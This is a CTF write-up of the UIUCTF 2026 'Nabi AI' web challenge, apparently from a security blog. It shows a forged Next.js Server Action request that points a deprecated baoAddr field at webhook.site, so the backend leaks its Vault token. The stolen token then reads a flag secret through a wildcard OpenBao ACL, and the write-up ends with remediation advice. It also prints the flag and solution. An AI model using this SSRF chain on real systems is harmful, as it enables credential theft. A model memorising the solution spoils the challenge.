---
title: "UIUCTF 2026 Web Writeup: Nabi AI — Next.js Server Action SSRF Steals OpenBao Token"
slug: "uiuctf-2026-web-nabi-ai-writeup"
description: "Complete UIUCTF 2026 Nabi AI web writeup — a two-stage chain against a Next.js chat frontend, an OpenBao (HashiCorp Vault fork) secret store, and a token-gated flag service. Stage one: a deprecated baoAddr property in the SendMessageRequest TypeScript type is still accepted by the sendMessage Server Action, so a React Server Components request with Next-Action: 407e153…, an $undefined conversationId, and baoAddr pointing at webhook.site causes the backend to forward its X-Vault-Token header to the attacker's URL as a credential-leaking SSRF. Stage two: OpenBao's application policy uses the wildcard path secret/data/+ instead of the exact secret/data/nabi, so the stolen token also reads secret/data/flag and returns the FLAG_API_KEY, which the flag service accepts as x-api-token and returns uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}."
date: 2026-08-11T05:00:00Z
lastmod: 2026-08-11T05:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
series: ["UIUCTF 2026"]
tags:
  - "uiuctf"
  - "uiuctf 2026"
  - "uiuc ctf"
  - "ctf writeup"
  - "web"
  - "web security"
  - "nabi ai"
  - "next.js"
  - "next.js server actions"
  - "server actions"
  - "react server components"
  - "rsc"
  - "next-action header"
  - "source map exposure"
  - "typescript type leak"
  - "deprecated api"
  - "openbao"
  - "hashicorp vault"
  - "vault acl"
  - "vault policy wildcard"
  - "kv v2 secrets"
  - "ssrf"
  - "credential leaking ssrf"
  - "x-vault-token"
  - "microservice trust boundary"
  - "least privilege"
  - "ctf 2026"
keywords:
  - "uiuctf 2026 nabi ai writeup"
  - "uiuctf 2026 web writeup"
  - "nabi ai ctf writeup"
  - "next.js server action ssrf writeup"
  - "next-action header exploit ctf"
  - "react server components $undefined marker"
  - "next.js source map exposure ctf"
  - "openbao ssrf token leak ctf"
  - "hashicorp vault path wildcard secret/data/+ exploit"
  - "vault acl plus segment glob ctf"
  - "x-vault-token forwarded to attacker ctf"
  - "sendMessage baoAddr deprecated property ssrf"
  - "openbao kv v2 read secret data flag ctf"
  - "microservice trust boundary credential exfiltration"
  - "uiuctf 2026 solutions"
  - "ctf step by step 2026"
toc: true
cover:
  image: "/images/articles/uiuctf-2026-web-nabi-ai-writeup.png"
  alt: "UIUCTF 2026 Nabi AI web writeup cover — a two-stage chain against a Next.js chat frontend, an OpenBao HashiCorp Vault fork secret store, and a token-gated flag service. Stage one recovers a hidden server input by downloading the production Next.js source map at slash underscore next slash static slash chunks slash 3gby4tb3 underscore 0bas dot js dot map, finding the deprecated baoAddr optional property in the SendMessageRequest TypeScript type, extracting the sendMessage Server Action ID 407e153d5824829d199a24b87d41748243b5d2fdf3 from the createServerReference call, and sending an RSC request with the Next-Action header, an $undefined marker for conversationId, and baoAddr pointing at a webhook so the backend forwards its X-Vault-Token header to the attacker URL. Stage two exploits an OpenBao application policy that grants read on path secret/data/+ (single-segment wildcard) rather than the exact secret/data/nabi, so the stolen token also reads secret/data/flag and returns FLAG_API_KEY which the flag service accepts as x-api-token and returns uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}"
---

**UIUCTF 2026**'s Nabi AI is a masterclass in how an ordinary Next.js app becomes a full credential-exfiltration chain when two mundane development shortcuts survive into production. The frontend is a small chat UI. The backend is a Next.js Server Action that talks to an OpenBao (HashiCorp Vault fork) KV store for its API key. A separate flag service accepts an `x-api-token` header. Nothing about the architecture is inherently vulnerable — every service is doing what it advertises. The chain lives entirely in two decisions that are individually reasonable and collectively fatal: **a deprecated request field that was never actually removed**, and **a Vault ACL glob that was never actually tightened**.

Stage one takes advantage of a `baoAddr` property still declared on `SendMessageRequest` in the client TypeScript types (source map exposed, because Next.js ships one by default). The chat form never populates it, but the Server Action still reads it, and passes it verbatim to the outbound OpenBao HTTP client — headers and all. Point `baoAddr` at a webhook and the server obligingly leaks its `X-Vault-Token`. Stage two takes advantage of the application's Vault policy: instead of `path "secret/data/nabi"`, it grants read on `path "secret/data/+"`. That single-segment glob covers the intended `secret/data/nabi` **and** the sensitive `secret/data/flag`. The stolen token reads both. The `FLAG_API_KEY` unlocks the flag service, which returns `uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}` — a self-deprecating flag body that argues its own case.

Handout, per-challenge README, `config.hcl`, and a dependency-free Python solver live at [Abdelkad3r/UIUCTF-2026](https://github.com/Abdelkad3r/UIUCTF-2026/tree/main/nabi-ai). This **CyberSecurity Elite** UIUCTF 2026 web writeup walks the full chain end to end, with an emphasis on the *React Server Components request format* the intended exploit requires and on the *Vault policy semantics* that make the glob dangerous. Read alongside the paired [UIUCTF 2026 Miscellaneous writeup](/ctf-writeups/uiuctf-2026-misc-writeup/) covering all three jail escapes from the same event.

## Nabi AI at a glance

| Property | Value |
|---|---|
| Category | Web |
| Bug class | Deprecated-input SSRF (credential leak) + broad Vault ACL |
| Attack primitives | Source-map disclosure · Next.js Server Actions (RSC protocol) · header-forwarding SSRF · Vault KV path-glob |
| Vulnerable surface | `SendMessageRequest.baoAddr` (deprecated but wired) · policy `path "secret/data/+"` |
| Flag | `uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}` |

Everything you need to solve the challenge sits between two small pieces of source code: a five-line TypeScript type declaration in the browser bundle, and a three-line HCL policy in the supplied `config.hcl`. Neither reads as an obvious vulnerability on its own; joined together, they compose a clean unauthenticated read of the flag secret.

---

## The service layout

Every instance provisions three hostnames on the `chal.uiuc.tf` subdomain:

```text
https://<instance>-nabi-ai.chal.uiuc.tf/               # Next.js chat app
https://<instance>-openbao-nabi-ai.chal.uiuc.tf/       # OpenBao secret store
https://<instance>-flag-service-nabi-ai.chal.uiuc.tf/  # token-gated flag API
```

OpenBao's root returns `404`; its health endpoint confirms an initialized, unsealed instance:

```bash
curl -s https://<openbao-host>/v1/sys/health | jq
```

```json
{
  "initialized": true,
  "sealed": false,
  "standby": false
}
```

Hitting the flag service unauthenticated establishes its contract — and names the header the exploit will need at the end:

```bash
curl -i https://<flag-service-host>/
```

```json
{
  "error": "Invalid API key. Please provide a valid API key with the x-api-token header."
}
```

Nothing else is exposed. There is no login page, no admin route, no `.env` handout, no `robots.txt` disclosure. Every visible reconnaissance path leads back to the chat UI.

## Step 1 — audit the OpenBao policy

The supplied [`config.hcl`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/nabi-ai/config.hcl) is the only source artifact. It initializes the KV v2 mount, creates two secrets, and issues the application token bound to a single policy.

The two secrets:

```hcl
path = "secret/data/nabi"
data = { data = {
  NABI_API_KEY = { ... }
}}
```

```hcl
path = "secret/data/flag"
data = { data = {
  FLAG_API_KEY = { ... }
}}
```

The policy attached to the application token:

```hcl
path "secret/data/+" {
  capabilities = ["read"]
}
```

The `+` in an OpenBao / Vault ACL path is not a regex — it is a **single-segment glob**. It matches exactly one path segment (no `/`), and therefore covers both:

```text
secret/data/nabi   ✓ intended
secret/data/flag   ✓ unintended
```

The correct policy for the application's actual needs is a literal path:

```hcl
path "secret/data/nabi" {
  capabilities = ["read"]
}
```

The token itself is provisioned with the strictest reasonable flags:

```hcl
policies          = ["nabi-app"]
no_parent         = true
no_default_policy = true
renewable         = false
```

Those flags prevent token-lifetime abuses (renewal, hierarchy), but they do not narrow the ACL. Once the token is in an attacker's hands, it can read anything the policy allows — which is any single-segment secret under `secret/data/`.

The remaining problem is either recovering the token directly or steering the application into using it against a path the attacker chose.

## Step 2 — inspect the client source map

The chat page is a compiled Next.js production build. The visible HTML is minimal. The interesting attack surface is not in the DOM — it is in the JavaScript chunks and, critically, their **source maps**.

Next.js ships source maps for production builds by default when `productionBrowserSourceMaps: true` is set (or, in many templates, when a build tool leaves them in). Every client chunk ends with a comment such as:

```text
//# sourceMappingURL=3gby4tb3_0bas.js.map
```

Downloading that map reproduces the original TypeScript source. The relevant file is `app/_types/chat.ts`, which declares the request shape the frontend sends to the `sendMessage` Server Action:

```typescript
export type SendMessageRequest = {
  conversationId?: string;
  content: string;
  /** @deprecated Left in for backwards compatibility.
   * Used in development to set the openbao url */
  baoAddr?: string;
};
```

Three details from that five-line type are load-bearing:

1. **The visible chat form only sends `conversationId` and `content`.** `baoAddr` is a hidden input — supported by the server, but never populated by the client UI. That is the archetypal *deprecated-in-name-only* trap.
2. **The comment explicitly says what it does.** It sets the OpenBao URL for development. In production the OpenBao URL should be a server-side constant.
3. **The property is optional.** Optional means the server accepts requests without it, which is exactly what production traffic does — so the code path that *uses* it is exercised only by attackers.

The same client chunk also identifies the exported Server Action and its build-specific action ID:

```javascript
createServerReference(
  "407e153d5824829d199a24b87d41748243b5d2fdf3",
  callServer,
  undefined,
  findSourceMapURL,
  "sendMessage"
);
```

That 42-character hex string is the ID Next.js uses to dispatch RSC (React Server Components) action calls. It changes on every build and must be extracted from the current bundle; do not cache it across instances.

## Step 3 — forge a React Server Components request

The Server Action is invoked with a plain HTTP POST that carries three protocol-specific headers and a very specific body encoding:

- **`Next-Action`** — the action ID from `createServerReference`.
- **`Content-Type: text/plain;charset=UTF-8`** — RSC action bodies are typed as text, not JSON, despite parsing as JSON on the server.
- **`Accept: text/x-component`** — the client tells the server it expects an RSC response stream.

The body is a JSON array of positional arguments. For a single-object argument, the array contains one object. JavaScript `undefined` on the wire is represented by the Flight marker `$undefined` (because JSON does not encode `undefined`):

```json
[
  {
    "conversationId": "$undefined",
    "content": "Hello",
    "baoAddr": "https://webhook.site/<collection-id>"
  }
]
```

Full `curl` invocation:

```bash
curl -sS -X POST 'https://<nabi-host>/' \
  -H 'Accept: text/x-component' \
  -H 'Content-Type: text/plain;charset=UTF-8' \
  -H 'Next-Action: 407e153d5824829d199a24b87d41748243b5d2fdf3' \
  -H 'Origin: https://<nabi-host>' \
  --data-binary '[{"conversationId":"$undefined","content":"Hello","baoAddr":"https://webhook.site/<collection-id>"}]'
```

The server processes the message. The response is an error — the attacker's webhook does not return a valid KV v2 secret shape, and the chat handler fails when it tries to parse the response. That failure is harmless from the attacker's perspective. Before parsing, the backend already made this outbound HTTP request:

```text
GET /<collection-id>/v1/secret/data/nabi HTTP/1.1
Host: webhook.site
X-Vault-Token: nabi-local-app-token-...
```

The `X-Vault-Token` header is the payoff. The backend forwards its privileged OpenBao token to whatever host `baoAddr` names, because the OpenBao client wraps every outbound call with the same auth header regardless of destination. This is not a URL-open primitive — it is a **credential-leaking SSRF**, which is materially stronger.

## Step 4 — read the flag secret directly

The captured OpenBao token is now applied against the *legitimate* OpenBao endpoint from the challenge instance:

```bash
APP_TOKEN='nabi-local-app-token-...'

curl -sS 'https://<openbao-host>/v1/secret/data/flag' \
  -H "X-Vault-Token: ${APP_TOKEN}" | jq
```

OpenBao's KV v2 read succeeds:

```json
{
  "data": {
    "data": {
      "FLAG_API_KEY": "sk-flag-..."
    },
    "metadata": {
      "version": 1
    }
  }
}
```

The request succeeds *specifically because* `secret/data/flag` matches the `secret/data/+` policy path. If the policy had been the exact `secret/data/nabi`, the token would return a permission-denied response and the chain would end here — the SSRF would have exfiltrated a token that could only read a secret the challenge already implies is boring.

This is where the least-privilege argument stops being a slogan. The Vault ACL absorbs the impact of an entire class of credential-theft bugs upstream. Get it right, and stealing the token still needs a second bug (or a different secret) to reach the flag. Get it wrong once with `+`, and every stolen token is a full compromise.

## Step 5 — authenticate to the flag service

The flag service takes the API key in the header it named in its opening error message:

```bash
FLAG_API_KEY='sk-flag-...'

curl -sS 'https://<flag-service-host>/' \
  -H "x-api-token: ${FLAG_API_KEY}" | jq
```

Response:

```json
{
  "flag": "uiuctf{lets_just_go_back_to_a_monolith_983c1ec97484}"
}
```

`lets_just_go_back_to_a_monolith` is the intended reading. The chain is only possible because every service in the split architecture trusts a shared token that traverses a shared network — a monolith would not have needed to *forward* a Vault token at all.

## Automated end-to-end solver

[`solve.py`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/nabi-ai/solve.py) automates the full chain using only Python's standard library. Its workflow:

1. Fetch the chat page and discover the current build's JavaScript chunks.
2. Parse the chunks to extract the `sendMessage` Server Action ID (rebuilds change it).
3. Create a temporary webhook collection.
4. Send the RSC action request with `baoAddr` pointing at the collection.
5. Poll the collection until the incoming request appears; extract `X-Vault-Token`.
6. Read `secret/data/flag` with the token.
7. Call the flag service with the recovered `FLAG_API_KEY`.

Because challenge instances rotate, pass all three fresh URLs:

```bash
python3 solve.py \
  --challenge    'https://<instance>-nabi-ai.chal.uiuc.tf/' \
  --openbao      'https://<instance>-openbao-nabi-ai.chal.uiuc.tf/' \
  --flag-service 'https://<instance>-flag-service-nabi-ai.chal.uiuc.tf/'
```

No endpoint or credential brute force is performed. The solver makes exactly one Server Action request, polls only its own webhook collection, and issues the two authenticated requests required to finish the chain. Total on-wire cost is single-digit HTTP requests, all against advertised endpoints.

## Root cause and remediation

Two independent controls failed, and the challenge composes them into a chain. Fixing either one alone downgrades the impact substantially; fixing both is the intended defensive posture.

### 1. Deprecated input crossed the trust boundary

The `baoAddr` property was described as development-only, yet the production Server Action still parsed and consumed it. The remediation is not to "sanitize" the URL — that leads to bypass whack-a-mole (allow-list schemes, block private IPs, catch redirects, catch DNS rebinding, etc.). It is to **remove the property from the production action input entirely**, and keep the OpenBao address in server-side configuration where it belongs.

For general Next.js Server Actions this generalizes to a rule: *if a request field is not exercised by any client code path, do not accept it on the server*. Server Actions accept arbitrary named fields precisely because they are strongly typed to a client contract; when the client contract shrinks, the server contract must shrink with it.

### 2. Wildcard ACL allowed reads beyond the intended secret

The Vault policy granted read on `secret/data/+` — one segment glob — instead of the specific `secret/data/nabi`. Replace it with:

```hcl
path "secret/data/nabi" {
  capabilities = ["read"]
}
```

If the application ever legitimately needs multiple secrets, they should be named explicitly (multiple `path` blocks). Globs in Vault ACLs should be reserved for cases where the *contents* of the path space are administratively controlled and predictable — not for cases where "we only wrote one secret to this mount so far."

### Useful defense in depth

Even with both bugs closed, additional layers make similar mistakes cheaper:

- **Outbound network restrictions** on the chat container (deny egress except to known OpenBao IPs). Would have made the SSRF exfiltrate to nowhere.
- **Vault-side response wrapping / audit** so tokens have limited replay windows and every read is logged.
- **Header allow-listing** on the OpenBao client — do not forward `X-Vault-Token` to arbitrary hosts.

None of those replace the two source fixes. They compress the blast radius when a fresh instance of the same class of bug appears.

## Cross-cutting lessons

- **A `@deprecated` comment is a documentation edit, not a code change.** Field-level deprecation in TypeScript is a lint hint for the *caller*, not a runtime removal on the *callee*. If the server still reads it, deprecated is a synonym for "shipped."
- **Source maps in production leak your entire client type system.** Next.js's default behavior ships them in many templates. If your bundler emits `.js.map`, an attacker has your original TypeScript, your action IDs, your deprecated properties, and every code comment you thought was private.
- **SSRF that steals a credential is a different bug class than SSRF that fetches a URL.** URL-fetch SSRF is bounded by what the endpoint can see. Credential-leak SSRF is bounded by what the credential can do — anywhere on the internet, from any attacker machine.
- **Path globs in Vault ACLs are almost always wrong.** `+` matches one segment; `*` matches multiple. Neither should ever be used as the primary access-control decision in an application policy. Enumerate the paths.
- **The trust boundary is not the network boundary.** OpenBao lives on the same private network as the chat backend, but the chat backend forwards its Vault token to arbitrary internet destinations because it treats "wherever `baoAddr` says" as inside the trust boundary. Trust is what a service assumes about the request, not where the request arrives from.

## Reproduce it yourself

The [Nabi AI directory](https://github.com/Abdelkad3r/UIUCTF-2026/tree/main/nabi-ai) contains everything needed for a fresh solve:

- [`README.md`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/nabi-ai/README.md) — the step-by-step exploit narrative summarized above.
- [`config.hcl`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/nabi-ai/config.hcl) — the OpenBao initialization file that documents the vulnerable policy.
- [`solve.py`](https://github.com/Abdelkad3r/UIUCTF-2026/blob/main/nabi-ai/solve.py) — dependency-free end-to-end solver (Python standard library only).

Browse the full [CTF writeups](/ctf-writeups/) archive for more Next.js / Server Actions and secret-store walkthroughs, or read the companion [UIUCTF 2026 Miscellaneous writeup](/ctf-writeups/uiuctf-2026-misc-writeup/) covering all three jail escapes from the same event (Java `SecurityManager` bypass via `getDeclaredFields0`, CNN evasion with identifier-ignorable code points, and Emacs 30.2 native-compile bypass via the `featurep` compiler macro).

---

*This writeup is part of the CyberSecurity Elite [UIUCTF 2026](/series/uiuctf-2026/) series. Handout, per-challenge README, `config.hcl`, and the standard-library solver for Nabi AI are published at [github.com/Abdelkad3r/UIUCTF-2026](https://github.com/Abdelkad3r/UIUCTF-2026).*
